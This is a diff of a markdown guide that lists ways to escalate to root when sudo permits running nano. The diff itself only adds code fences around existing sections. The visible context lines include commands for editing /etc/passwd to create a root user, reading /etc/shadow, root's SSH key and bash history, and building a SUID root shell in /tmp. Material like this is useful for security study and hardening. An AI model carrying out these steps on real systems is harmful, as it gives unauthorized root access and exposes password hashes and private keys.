@@ -55,6 +55,7 @@ sudo su
 
 ## Method 2: Edit Passwd File
 
+```
 bash
 
 # Edit /etc/passwd to change root shell or create new root user
@@ -66,18 +67,22 @@ sudo nano /etc/passwd
 
 # Then switch to that user
 su newroot
+```
 
 ## Method 3: Read Root Files
 
+```
 bash
 
 # Use nano to read sensitive files
 sudo nano /etc/shadow
 sudo nano /root/.ssh/id_rsa
 sudo nano /root/.bash_history
+```
 
 ## Method 4: Create SUID Shell
 
+```
 bash
 
 # Create a C program that spawns shell
@@ -108,6 +113,7 @@ sudo nano /tmp/compile.sh
 sudo chmod +x /tmp/compile.sh
 sudo /tmp/compile.sh
 /tmp/rootshell
+```
 
 ## Method 5: Through Nano's Spell Check Feature
 
